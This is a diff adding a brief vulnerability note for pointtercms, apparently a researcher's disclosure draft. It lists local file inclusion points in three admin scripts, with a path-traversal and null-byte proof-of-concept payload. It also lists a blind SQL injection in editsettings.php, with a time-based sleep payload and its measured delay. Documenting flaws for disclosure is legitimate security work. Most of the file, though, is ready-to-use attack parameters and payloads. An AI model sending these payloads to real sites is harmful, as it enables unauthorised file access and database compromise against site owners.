@@ -1,0 +1,19 @@
+
+LFI:
+script: pointtercms/admin/functions/createcategory.php
+post param: category
+poc: category=../../../../../../../../../test.txt%00&code=0e=0
+
+script: pointtercms/admin/functions/createpage.php
+post param: pageurl
+
+script: pointtercms/admin/functions/createproduct.php
+post param: producturl
+
+
+bSQLi:
+script: pointtercms/admin/functions/editsettings.php
+post param: onoff, count, boxname, tonoff, tname, monoff, mname, nonoff, nname,
+memonoff, memname, searchonoff, searchname, pos, tpos, mpos, npos, mempos, mail.
+poc: onoff=1'+and+sleep(10)%23&pos=0
+- Response size: 0 bytes, Duration: 10016 ms
